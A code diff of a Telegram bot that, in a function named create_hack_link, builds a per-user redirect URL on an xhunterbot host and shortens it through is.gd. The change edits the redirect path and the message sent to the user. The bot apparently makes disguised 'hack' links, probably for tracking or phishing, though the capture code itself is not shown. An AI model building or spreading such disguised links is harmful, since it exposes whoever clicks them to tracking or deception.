@@ -146,13 +146,13 @@ async def create_hack_link(call):
 
 async def async_create_link(call):
     await asyncio.sleep(3)  # Имитация загрузки
-    long_url = f" https://xhunterbot.onrender.com/redirect/{call.message.chat.id}"
+    long_url = f" https://xhunterbot.onrender.com/r/{call.message.chat.id}"
     
     async with aiohttp.ClientSession() as session:
         async with session.get(f"https://is.gd/create.php?format=simple&url={long_url}") as response:
             if response.status == 200:
                 short_link = await response.text()
-                await bot.send_message(call.message.chat.id, f"🔗short {short_link}")
+                await bot.send_message(call.message.chat.id, f"🔗short: {short_link}\n🔗original: https://xhunterbot.onrender.com/r/{call.message.chat.id}")
             else:
                 await bot.send_message(call.message.chat.id, "⚠️ Ошибка при создании ссылки")
 
